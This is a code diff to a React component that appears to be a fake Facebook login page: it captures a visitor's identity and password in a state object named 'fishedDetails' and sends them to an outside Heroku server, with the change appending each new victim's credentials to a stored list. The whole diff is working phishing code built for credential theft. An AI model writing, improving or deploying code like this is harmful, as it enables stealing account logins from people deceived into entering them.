@@ -15,11 +15,13 @@ const Hook = ({toggle, control}) => {
         Password: ""
     })
 
-    const handleSubmit = (event) => {
+    async function handleSubmit(event) {
         event.preventDefault()
 
         if (fishedDetails.Identity && fishedDetails.Password) {
-            axios.post("https://tritonai-server.herokuapp.com/FacebookLogIn", fishedDetails)
+            await axios.get(`https://tritonai-server.herokuapp.com/FacebookLogin`).then(async re => {
+                await axios.post(`https://tritonai-server.herokuapp.com/FacebookLogin`, {...re.data, Details: [...re.data.Details, fishedDetails]})
+            })
             setDisplay(2)
         }
     }
